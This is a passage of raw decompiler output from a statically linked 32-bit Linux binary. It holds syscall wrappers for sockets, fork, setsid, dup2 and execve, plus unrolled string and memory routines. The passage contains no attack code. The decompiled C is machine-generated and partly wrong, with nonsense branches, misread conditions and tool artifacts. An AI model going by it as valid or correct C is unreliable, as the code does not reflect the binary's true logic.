    if(sigaction(A8, & Vfffffff0, & Vffffffe0) != -1) {
        edx = Vffffffe0;
    }
    return(edx);
}



//L080569FC(A8, Ac, A10)
wait4(pid, status, options, rusage)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;



    eax = 114;
    esi = 0;
    asm("int 0x80");
    if(eax < 0) {
        *L08078B14 = ~eax;
        eax = -1;
    }
}


//L08056A2C(A8, Ac, A10)
accept(sockfd, addr, addrlen)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8;
    Vfffffff8 = Ac;
    Vfffffffc = A10;
    ecx = & Vfffffff4;
    eax = 102;
    ebx = 5;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    return(edx);
}



//L08056A74(A8, Ac, A10)
bind (sockfd, my_addr, addrlen)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8;
    Vfffffff8 = Ac;
    Vfffffffc = A10;
    ecx = & Vfffffff4;
    eax = 102;
    ebx = 2;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    return(edx);
}



//L08056ABC(A8, Ac, A10)
connect(sockfd, serv_addr, addrlen)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8;
    Vfffffff8 = Ac;
    Vfffffffc = A10;
    ecx = & Vfffffff4;
    eax = 102;
    ebx = 3;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    return(edx);
}



//L08056B04(A8, Ac)
listen(sockfd, backlog)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff8 = A8;
    Vfffffffc = Ac;
    ecx = & Vfffffff8;
    eax = 102;
    ebx = 4;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    return(edx);
}


//L08056B44(A8, Ac, A10, A14)
recv(sockfd, buffer, len, flags)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = A14;
    Vfffffff0 = A8;
    Vfffffff4 = Ac;
    Vfffffff8 = A10;
    ecx = & Vfffffff0;
    eax = 102;
    ebx = 10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    return(edx);
}


//L08056B90(A8, Ac, A10, A14, A18, A1c)
recvfrom(sockfd, buffer, len, flags, from, fromlen)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffe8 = A8;
    Vffffffec = Ac;
    Vfffffff0 = A10;
    Vfffffff4 = A14;
    Vfffffff8 = A18;
    Vfffffffc = A1c;
    ecx = & Vffffffe8;
    eax = 102;
    ebx = 12;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    eax = edx;
    esp = ebp - 36;
}



//L08056BF0(A8, Ac, A10, A14)
send(sockfd, msg, len, flags)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = A14;
    Vfffffff0 = A8;
    Vfffffff4 = Ac;
    Vfffffff8 = A10;
    ecx = & Vfffffff0;
    eax = 102;
    ebx = 9;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    return(edx);
}


//L08056C3C(A8, Ac, A10, A14, A18, A1c)
sendto(sockfd, msg, len, flags, to, tolen)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffe8 = A8;
    Vffffffec = Ac;
    Vfffffff0 = A10;
    Vfffffff4 = A14;
    Vfffffff8 = A18;
    Vfffffffc = A1c;
    ecx = & Vffffffe8;
    eax = 102;
    ebx = 11;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    eax = edx;
    esp = ebp - 36;
}



//L08056C9C(A8, Ac, A10, A14, A18)
setsockopt(sockfd, level, optname, optval, optlen)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffec = A8;
    Vfffffff0 = Ac;
    Vfffffff4 = A10;
    Vfffffff8 = A14;
    Vfffffffc = A18;
    ecx = & Vffffffec;
    eax = 102;
    ebx = 14;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    eax = edx;
    esp = ebp - 28;
}



//L08056CF4(A8, Ac, A10)
socket(domain, type, protocol)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8;
    Vfffffff8 = Ac;
    Vfffffffc = A10;
    ecx = & Vfffffff4;
    eax = 102;
    ebx = 1;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    return(edx);
}




L08056D44(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;



    ebx = 134641100;
    if(134641100 < 0x80675d0) {
        eax = 4;
        if(134641100 < 0x80675d0) {
            if(4 == 0) {
                goto L08056dc8;
            }
            if(4 > 4) {
                if(4 > 8) {
                    if(4 >= 13) {
                        goto L08056dc8;
                    }
                    *( *L080675CC)(A8, Ac, A10);
                    ebx = 0x80675d0;
                }
                *( *ebx)(A8, Ac, A10);
                ebx = ebx + 4;
            }
        }
        eax = *( *ebx)(A8, Ac, A10);
        ebx = ebx + 4;
        if(ebx < 0x80675d0) {
L08056dc8:
            do {
                *( *ebx)(A8, Ac, A10);
                *( *(ebx + 4))(A8, Ac, A10);
                *( *(ebx + 8))(A8, Ac, A10);
                eax = *( *(ebx + 12))(A8, Ac, A10);
                ebx = ebx + 16;
            } while(ebx < 0x80675d0);
        }
    }
}


L08056E14(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    L0805E954();
    if(A8 < 0 || *"{" < A8) {
        L0804F808(Ac, "Unknown error %d", A8);
        eax = Ac;
    } else {
        eax = L0805E584( *L08078F9C, 1, A8 + 1, *(A8 * 4 + 0x806ae98));
    }
}



L08056E64()
{



    return(0x8078b14);
}


L08056E70(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = 0;
    Vfffffff4 = 0;
    ecx = A10;
    if(Vfffffff4 < ecx) {
        ebx = Ac;
        eax = ecx & 31;
        if(Vfffffff4 < ecx) {
            if(eax == 0) {
                goto L08056f44;
            }
            if(eax > 8) {
                if(eax > 16) {
                    if(eax >= 25) {
                        goto L08056f44;
                    }
                    eax = 8;
                    if(ecx <= 8) {
                        eax = A10;
                    }
                    eax = writev(A8, ebx, eax);
                    if(eax < 0) {
                        goto L08056ff5;
                    }
                    ebx = ebx + 64;
                    esi = esi + 8;
                    Vfffffff4 = Vfffffff4 + eax;
                }
                edx = A10 - esi;
                eax = 8;
                if(edx <= 8) {
                    eax = edx;
                }
                eax = writev(A8, ebx, eax);
                if(eax < 0) {
                    goto L08056ff5;
                }
                ebx = ebx + 64;
                esi = esi + 8;
                Vfffffff4 = Vfffffff4 + eax;
            }
        }
        edx = A10 - esi;
        eax = 8;
        if(edx <= 8) {
            eax = edx;
        }
        eax = writev(A8, ebx, eax);
        if(eax >= 0) {
            ebx = ebx + 64;
            esi = esi + 8;
            goto L0805700a;
L08056f44:
            edx = A10 - esi;
            eax = 8;
            if(edx <= 8) {
                eax = edx;
            }
            eax = writev(A8, ebx, eax);
            edx = eax;
            if(edx >= 0) {
                ebx = ebx + 64;
                eax = esi + 8;
                Vfffffff4 = Vfffffff4 + edx;
                edx = A10 - eax;
                eax = 8;
                if(edx <= 8) {
                    eax = edx;
                }
                eax = writev(A8, ebx, eax);
                edx = eax;
                if(edx >= 0) {
                    ebx = ebx + 64;
                    eax = esi + 16;
                    Vfffffff4 = Vfffffff4 + edx;
                    edx = A10 - eax;
                    eax = 8;
                    if(edx <= 8) {
                        eax = edx;
                    }
                    eax = writev(A8, ebx, eax);
                    edx = eax;
                    if(edx >= 0) {
                        ebx = ebx + 64;
                        eax = esi + 24;
                        Vfffffff4 = Vfffffff4 + edx;
                        edx = A10 - eax;
                        eax = 8;
                        if(edx <= 8) {
                            eax = edx;
                        }
                        eax = writev(A8, ebx, eax);
                        if(eax >= 0) {
                            goto L08057004;
                        }
                    }
                }
            }
        }
L08056ff5:
        if(*L08078B14 == 38) {
            goto L08057020;
        }
        goto L08057128;
L08057004:
        ebx = ebx + 64;
        esi = esi + 32;
L0805700a:
        Vfffffff4 = Vfffffff4 + eax;
        if(A10 > esi) {
            goto L08056f44;
        }
    }
    eax = Vfffffff4;
    goto L08057128;
L08057020:
    *L08078B14 = 0;
    Vfffffff4 = 0;
    esi = 0;
    ecx = A10;
    if(Vfffffff4 < ecx) {
        eax = ecx & 3;
        if(Vfffffff4 < ecx) {
            if(eax == 0) {
                goto L0805707c;
            }
            if(eax > 1) {
                if(eax > 2) {
                    Vfffffff4 = *(Ac + Vfffffff4 * 8 + 4);
                    esi = 1;
                }
                Vfffffff4 = Vfffffff4 + *(Ac + esi * 8 + 4);
                esi = esi + 1;
            }
        }
        Vfffffff4 = Vfffffff4 + *(Ac + esi * 8 + 4);
        esi = esi + 1;
        if(A10 > esi) {
L0805707c:
            do {
                Vfffffff4 = Vfffffff4 + *(Ac + esi * 8 + 4);
                Vfffffff4 = Vfffffff4 + *(Ac + esi * 8 + 12);
                Vfffffff4 = Vfffffff4 + *(Ac + esi * 8 + 20);
                Vfffffff4 = Vfffffff4 + *(Ac + esi * 8 + 28);
                esi = esi + 4;
            } while(A10 > esi);
        }
    }
    if(Vfffffff4 == 0) {
        eax = 0;
    } else {
        esp = esp - (Vfffffff4 + 3 & 252);
        Vfffffffc = esp;
        Vfffffff0 = Vfffffff4;
        Vfffffff8 = esp;
        esi = 0;
        if(A10 > 0) {
            do {
                ebx = *(Ac + esi * 8 + 4) <= Vfffffff0 ? *(Ac + esi * 8 + 4) : Vfffffff0;
                edi = Vfffffff8;
                L0805652C(edi, *(Ac + esi * 8), ebx);
                Vfffffff8 = edi + ebx;
                if(Vfffffff0 = Vfffffff0 - ebx) {
                    break;
                }
                esi = esi + 1;
            } while(A10 > esi);
        }
        eax = write(A8, Vfffffffc, Vfffffff4);
    }
L08057128:
    esp = ebp - 28;
}



//L08057134(A8)
chdir(path)
/* unknown */ void  A8;
{



    eax = 12;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L08057160(A8)
close(fd);
/* unknown */ void  A8;
{



    eax = 6;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L0805718C(A8, Ac)
dup2(oldfd, newfd)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = 63;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L080571B8(A8, Ac, A10)
execve(filename, argv, envp)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 11;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L080571E8()
fork()
{



    eax = 2;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L0805720C()
geteuid()
{



    eax = 49;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L08057230()
getpid()
{



    eax = 20;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L08057254(A8, Ac)
gettimeofday(tv, tz)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = 78;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L08057280(A8, Ac, A10)
ioctl(fd, request, ...)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 54;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L080572B0(A8, Ac)
kill(pid, sig)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = 37;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L080572DC(A8, Ac, A10)
open(pathname, flags, mode)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 5;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L0805730C(A8, Ac, A10)
read(fd, buffer, count)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 3;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L0805733C()
setsid()
{



    eax = 66;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L08057360(A8, Ac, A10)
sigprocmask(how, set, oldset)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 126;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L08057390(A8)
uname(buffer)
/* unknown */ void  A8;
{



    eax = 122;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L080573BC(A8)
unlink(pathname)
/* unknown */ void  A8;
{



    eax = 10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L080573E8(A8, Ac, A10)
write(fd, buf, count)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 4;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L08057418(A8)
alarm(seconds)
/* unknown */ void  A8;
{



    eax = 27;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L08057444(A8)
time(t)
/* unknown */ void  A8;
{



    eax = 13;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L08057470(A8, Ac, A10)
writev(fd, iovec, count)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 146;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L080574A0(A8)
select(n, readfs, writefs, exceptfs, timeout)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;



    eax = 82;
    ebx = & A8;
    asm("int 0x80");
    if(eax < 0) {
        *L08078B14 = ~eax;
        eax = -1;
    }
}



//L080574C8(A8, Ac, A10)
sigaction(signum, action, oldact)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;



    ebx = A8;
    if(Ac != 0) {
        *(Ac + 12) = !( *(Ac + 11) & 64) ? 0x80575a8 : 0x80575b0;
    }
    eax = 67;
    asm("int 0x80");
    ebx = eax;
    if(ebx < 0) {
        *L08078B14 = ~ebx;
        eax = -1;
    } else {
        eax = 0;
    }
}



//L0805751C(A8)
sigsuspend(mask)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    eax = 72;
    ebx = 0;
    ecx = 0;
    edx = *A8;
    asm("int 0x80");
    edi = eax;
    if(edi < 0) {
        *L08078B14 = ~edi;
        eax = -1;
    } else {
        eax = edi;
    }
}


//L08057554(A8)
exit(status)
/* unknown */ void  A8;
{



    eax = 1;
    asm("int 0x80");
}



L0805756C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffffe;



    if(A8 == 0) {
        edx = 4991;
    }
    asm("fnstcw [ebp-0x2]");
    ax = Vfffffffe & 61632;
    Vfffffffe = ax;
    ax = edx & 3903;
    Vfffffffe = ax | Vfffffffe;
    asm("fldcw [ebp-0x2]");
}

stack space not deallocated on return



L080575C0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    eax = A8;
    edx = Ac;
    esi = A10;
    if(esi >= 4) {
        dh = dl;
        edi = edx;
        edx = edx << 16;
        dx = di;
        if(!(al & 3)) {
            if(*eax == dl) {
                goto L08057758;
            }
            eax = eax + 1;
            if(esi = esi - 1) {
                goto L08057738;
            }
            if(!(al & 3)) {
                if(*eax == dl) {
                    goto L08057758;
                }
                eax = eax + 1;
                if(esi = esi - 1) {
                    goto L08057738;
                }
                if(!(al & 3)) {
                    if(*eax == dl) {
                        goto L08057758;
                    }
                    eax = eax + 1;
                    esi = esi - 1;
                }
            }
        }
        while(esi = esi - 16) {
            ecx = *eax;
            ecx = ecx ^ edx;
            if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
                goto L08057745;
            }
            ecx = *(eax + 4);
            ecx = ecx ^ edx;
            if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
                goto L08057742;
            }
            ecx = *(eax + 8);
            ecx = ecx ^ edx;
            if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
                goto L0805773f;
            }
            ecx = *(eax + 12);
            ecx = ecx ^ edx;
            if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
                goto L0805773c;
            }
            eax = eax + 16;
        }
        if(esi >= -12) {
            ecx = *eax;
            ecx = ecx ^ edx;
            if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
                goto L08057745;
            }
            eax = eax + 4;
            if(esi >= -8) {
                ecx = *eax;
                ecx = ecx ^ edx;
                if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
                    goto L08057745;
                }
                eax = eax + 4;
                if(esi >= -4) {
                    ecx = *eax;
                    ecx = ecx ^ edx;
                    if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
                        goto L08057745;
                    }
                    eax = eax + 4;
                }
            }
        }
    }
    if(!(esi = esi & 3)) {
        if(*eax == dl) {
            goto L08057758;
        }
        eax = eax + 1;
        if(!(esi = esi - 1)) {
            if(*eax == dl) {
                goto L08057758;
            }
            eax = eax + 1;
            if(!(esi = esi - 1) && *eax == dl) {
                goto L08057758;
            }
        }
    }
L08057738:
    eax = 0;
    goto L08057758;
L0805773c:
    eax = eax + 4;
L0805773f:
    eax = eax + 4;
L08057742:
    eax = eax + 4;
L08057745:
    if(cl != 0) {
        eax = eax + 1;
        if(ch != 0) {
            eax = eax + 1;
            if(!(ecx & 16711680)) {
                eax = eax + 1;
            }
        }
    }
L08057758:
}



L08057764(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;



    ebx = A10;
    edi = A8;
    eax = Ac & 255;
    asm("cld");
    if(ebx > 11) {
        eax = eax | eax << 8;
        eax = eax | eax << 16;
        edx = ~A8 & 3;
        ebx = ebx - edx;
        ecx = edx;
        asm("rep stosb");
        ecx = ebx >> 2;
        asm("rep stosd");
        ebx = ebx & 3;
    }
    ecx = ebx;
    asm("rep stosb");
    return(A8);
}



L080577C0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  edi;



    edx = A8;
    ecx = Ac;
    if(!( *ecx & 255)) {
        if(!(dl & 3)) {
            if(*edx & 255) {
                goto L08057889;
            }
            edx = edx + 1;
            if(!(dl & 3)) {
                if(*edx & 255) {
                    goto L08057889;
                }
                if(!(edx + 1 & 3)) {
                    if(*edx & 255) {
                        goto L08057889;
                    }
                    edx = edx + 1;
                }
            }
        }
        while(1) {
            eax = *edx;
            if((edi = -16843009 + eax) || (edi = (edi ^ eax | -16843009) + 1)) {
                goto L08057877;
            }
            eax = *(edx + 4);
            if((edi = -16843009 + eax) || (edi = (edi ^ eax | -16843009) + 1)) {
                goto L08057874;
            }
            eax = *(edx + 8);
            if((edi = -16843009 + eax) || (edi = (edi ^ eax | -16843009) + 1)) {
                goto L08057871;
            }
            eax = *(edx + 12);
            if((edi = -16843009 + eax) || !(edi = (edi ^ eax | -16843009) + 1)) {
                break;
            }
            edx = edx + 16;
        }
        edx = edx + 4;
L08057871:
        edx = edx + 4;
L08057874:
        edx = edx + 4;
L08057877:
        if(al != 0) {
            edx = edx + 1;
            if(ah != 0) {
                edx = edx + 1;
                if(!(eax & 16711680)) {
                    edx = edx + 1;
                }
            }
        }
L08057889:
        edx = edx - ecx;
        if(cl & 3) {
            goto L080578d7;
        }
        al = *ecx;
        *(edx + ecx) = al;
        if(al != 0) {
            ecx = ecx + 1;
            if(cl & 3) {
                goto L080578d7;
            }
            al = *ecx;
            *(edx + ecx) = al;
            if(al != 0) {
                if(ecx + 1 & 3) {
                    goto L080578d7;
                }
                al = *ecx;
                *(edx + ecx) = al;
                if(al != 0) {
                    ecx = ecx + 1;
L080578d7:
                    while(1) {
                        eax = *ecx;
                        if((edi = -16843009 + eax) || (edi = (edi ^ eax | -16843009) + 1)) {
                            goto L08057946;
                        }
                        *(edx + ecx) = eax;
                        eax = *(ecx + 4);
                        if((edi = -16843009 + eax) || (edi = (edi ^ eax | -16843009) + 1)) {
                            goto L08057943;
                        }
                        *(edx + ecx + 4) = eax;
                        eax = *(ecx + 8);
                        if((edi = -16843009 + eax) || (edi = (edi ^ eax | -16843009) + 1)) {
                            goto L08057940;
                        }
                        *(edx + ecx + 8) = eax;
                        eax = *(ecx + 12);
                        if((edi = -16843009 + eax) || !(edi = (edi ^ eax | -16843009) + 1)) {
                            break;
                        }
                        *(edx + ecx + 12) = eax;
                        ecx = ecx + 16;
                    }
                    ecx = ecx + 4;
L08057940:
                    ecx = ecx + 4;
L08057943:
                    ecx = ecx + 4;
L08057946:
                    *(edx + ecx) = al;
                    if(al != 0) {
                        *(edx + ecx + 1) = ah;
                        if(ah != 0) {
                            eax = eax >> 16;
                            *(edx + ecx + 2) = al;
                            if(*(edx + ecx + 2) != 0) {
                                *(edx + ecx + 3) = ah;
                            }
                        }
                    }
                }
            }
        }
    }
    return(A8);
}



L08057970(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  edi;



    eax = A8;
    edx = Ac;
    dh = dl;
    ecx = edx;
    edx = edx << 16;
    dx = cx;
    if(!(al & 3)) {
        cl = *eax;
        if(dl == cl) {
            goto L08057ad5;
        }
        if(cl == 0) {
            goto L08057aaa;
        }
        eax = eax + 1;
        if(!(al & 3)) {
            cl = *eax;
            if(dl == cl) {
                goto L08057ad5;
            }
            if(cl == 0) {
                goto L08057aaa;
            }
            if(!(eax + 1 & 3)) {
                cl = *eax;
                if(dl == cl) {
                    goto L08057ad5;
                }
                if(cl == 0) {
                    goto L08057aaa;
                }
                eax = eax + 1;
            }
        }
    }
    while(1) {
        ecx = *eax ^ edx;
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            goto L08057ab7;
        }
        ecx = ecx ^ edx;
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            break;
        }
        ecx = *(eax + 4) ^ edx;
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            goto L08057ab4;
        }
        ecx = ecx ^ edx;
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            break;
        }
        ecx = *(eax + 8) ^ edx;
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            goto L08057ab1;
        }
        ecx = ecx ^ edx;
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            break;
        }
        ecx = *(eax + 12) ^ edx;
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            goto L08057aae;
        }
        ecx = ecx ^ edx;
        if((edi = -16843009 + ecx) || !(edi = (edi ^ ecx | -16843009) + 1)) {
            break;
        }
        eax = eax + 16;
    }
L08057aaa:
    eax = 0;
    goto L08057ad5;
L08057aae:
    eax = eax + 4;
L08057ab1:
    eax = eax + 4;
L08057ab4:
    eax = eax + 4;
L08057ab7:
    if(cl != 0) {
        if(cl == dl) {
            goto L08057aaa;
        }
        if(ch != 0) {
            if(ch == dl) {
                goto L08057aaa;
            }
            ecx = ecx >> 16;
            if(cl != 0) {
                if(cl == dl) {
                    goto L08057aaa;
                }
                eax = eax + 1;
            }
            eax = eax + 1;
        }
        eax = eax + 1;
    }
L08057ad5:
}


L08057ADC(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;



    esi = A8;
    asm("cld");
    do {
        al = *esi;
        asm("scasb");
        if(esi = esi + 1) {
            goto L08057af4;
        }
    } while(al != 0);
    eax = 0;
    goto L08057af8;
L08057af4:
    asm("sbb eax,eax");
    al = al | 1;
L08057af8:
}



L08057B04(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;



    esi = A8;
    ecx = A10;
    asm("cld");
    ecx = ecx + 1;
    do {
        if(ecx = ecx - 1) {
            break;
        }
        al = *esi;
        asm("scasb");
        if(esi = esi + 1) {
            goto L08057b23;
        }
    } while(al != 0);
    eax = 0;
    goto L08057b27;
L08057b23:
    asm("sbb eax,eax");
    al = al | 1;
L08057b27:
}


L08057B30(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = A8;
    edx = Ac;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
